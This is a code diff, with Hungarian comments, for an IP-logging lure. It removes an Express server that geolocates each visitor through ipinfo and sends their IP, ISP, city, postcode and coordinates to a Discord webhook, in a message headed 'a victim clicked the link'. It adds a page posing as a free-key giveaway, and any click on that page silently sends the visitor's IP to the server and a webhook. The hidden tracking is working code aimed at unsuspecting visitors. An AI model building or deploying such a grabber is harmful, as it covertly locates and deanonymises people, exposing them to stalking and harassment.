@@ -1,57 +1,91 @@
-const express = require('express');
-const axios = require('axios');
-require('dotenv').config();
-const path = require('path');
-const app = express();
-const port = process.env.PORT || 3000;
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kulcs másoló weboldal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://cdn.discordapp.com/attachments/1127157742046543892/1400523086889226331/vip.png?ex=688cf244&is=688ba0c4&hm=671b4f7e8daa147678d2196c7908597af93023a468700110aa10fdaa5a69da29&" alt="VIP" class="icon">
 
-// Statikus fájlok kiszolgálása (CSS, JS, stb.)
-app.use(express.static(path.join(__dirname, 'public')));
+        <h1>Kattints a kulcs másolásához!</h1>
+        <div>
+            <input type="text" value="N3N-FREE-GWERR-GBFKIU-UTFCF-VHYTRE-WTF" readonly id="keyInput">
+            <button onclick="copyKey()">Másolás</button>
+        </div>
+        <div class="notification" id="notification">A kulcs sikeresen kimásolva!</div>
+    </div>
 
-// Webhook URL és IPINFO token a .env fájlból
-const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
-const ipinfoToken = process.env.IPINFO_TOKEN;
+    <script>
+        let webhookUrl = "";
+        let altWebhookUrl = "";
 
-// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
-});
-
-// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
-app.get('/get-webhook-url', (req, res) => {
-    res.json({ webhookUrl, altWebhookUrl });
-});
-
-// /send-ip útvonal
-app.get('/send-ip', async (req, res) => {
-    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
-
-    try {
-        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
-        const geoData = geoResponse.data;
-
-        const [latitude, longitude] = (geoData.loc || '0,0').split(',');
-
-        const message = {
-            username: "Helyszíni Naplózó <3",
-            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
-            content: `<@1095731086513930260>`,
-            embeds: [{
-                title: "Egy áldozat rákattintott a linkre!",
-                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
-                color: 0x800080
-            }]
+        // Webhook URL-k lekérése a szervertől
+        window.onload = function() {
+            fetch('/get-webhook-url')
+                .then(response => response.json())
+                .then(data => {
+                    webhookUrl = data.webhookUrl;  // Első webhook URL
+                    altWebhookUrl = data.altWebhookUrl; // Második webhook URL
+                })
+                .catch(error => {
+                    console.error('Hiba a webhook URL kérése közben:', error);
+                });
         };
 
-        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
-        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
-    } catch (error) {
-        console.error('Hiba:', error.message);
-        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
-    }
-});
+        // Másolja a kulcsot a vágólapra
+        function copyKey() {
+            const keyInput = document.getElementById('keyInput');
+            keyInput.select();  // Kiválasztja a szöveget
+            document.execCommand('copy');  // Kimásolja a vágólapra
 
-app.listen(port, () => {
-    console.log(`Server is running on http://localhost:${port}`);
-});
+            // Sikeres másolás üzenet megjelenítése
+            const notification = document.getElementById('notification');
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 2000);  // 2 másodpercig látszik
+        }
+
+        // Kattintás esetén IP küldése
+        document.addEventListener('click', function(event) {
+            // Ha nem a másoló gombot nyomták meg, akkor küldjük el a kattintás adatokat
+            if (event.target.tagName !== 'BUTTON') {
+                sendIpRequest('Link kattintás', webhookUrl);  // Az alapértelmezett webhook URL
+            }
+        });
+
+        // IP küldése a /send-ip útvonalra
+        function sendIpRequest(keyCombination, targetWebhookUrl) {
+            fetch('/send-ip')  // Küldés a /send-ip szerverhez
+                .then(response => response.json())  // Válasz JSON formátumban
+                .then(data => {
+                    console.log(data); // A szerver válasza
+                    // Webhook küldése
+                    sendToWebhook(data.ip, keyCombination, targetWebhookUrl);
+                })
+                .catch(error => {
+                    console.error('Hiba történt:', error);
+                });
+        }
+
+        // Webhook küldése a Discordra
+        function sendToWebhook(ip, keyCombination, targetWebhookUrl) {
+            const payload = {
+                content: `Ez az IP cím használta ezt a funkciót: ${ip} | Billentyűkombináció: ${keyCombination}`
+            };
+
+            fetch(targetWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Webhook válasz:', data))
+            .catch(error => console.error('Webhook hiba:', error));
+        }
+    </script>
+</body>
+</html>
